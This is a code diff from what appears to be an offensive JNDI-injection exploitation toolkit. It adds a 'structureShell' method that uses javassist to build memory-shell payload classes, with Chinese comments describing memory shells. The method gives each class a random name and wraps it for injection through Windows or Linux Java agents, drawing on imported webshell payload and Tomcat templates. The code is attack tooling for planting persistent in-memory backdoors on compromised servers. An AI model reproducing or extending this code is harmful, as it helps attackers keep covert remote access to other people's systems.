@@ -1,13 +1,16 @@
 package com.nu1r.jndi.gadgets.utils;
 
+import com.nu1r.jndi.gadgets.Config.Config;
 import com.nu1r.jndi.template.Agent.LinMenshell;
 import com.nu1r.jndi.template.Agent.WinMenshell;
+import com.nu1r.jndi.template.tomcat.TFJMX;
 import javassist.*;
 
 import java.lang.reflect.Field;
 import java.util.Arrays;
 import java.util.List;
 
+import static com.nu1r.jndi.gadgets.utils.ClassNameUtils.generateClassName;
 import static com.nu1r.jndi.template.shell.MemShellPayloads.*;
 import static com.nu1r.jndi.gadgets.Config.Config.*;
 
@@ -247,5 +250,29 @@ public class InjShell {
             CtClass superClass = pool.get(abstTranslet.getName());
             ctClass.setSuperclass(superClass);
         }
+    }
+
+    //路由器中内存马主要执行方法
+    public static String structureShell( Class<?> payload) throws Exception{
+        Config.init();
+        String    className = "";
+        ClassPool pool;
+        CtClass   ctClass;
+        pool = ClassPool.getDefault();
+        pool.insertClassPath(new ClassClassPath(payload));
+        ctClass = pool.get(payload.getName());
+        InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
+        ctClass.setName(generateClassName());
+        if (winAgent) {
+            className = insertWinAgent(ctClass);
+            return className;
+        }
+        if (linAgent) {
+            className = insertLinAgent(ctClass);
+            return className;
+        }
+        className = ctClass.getName();
+        ctClass.writeFile();
+        return className;
     }
 }
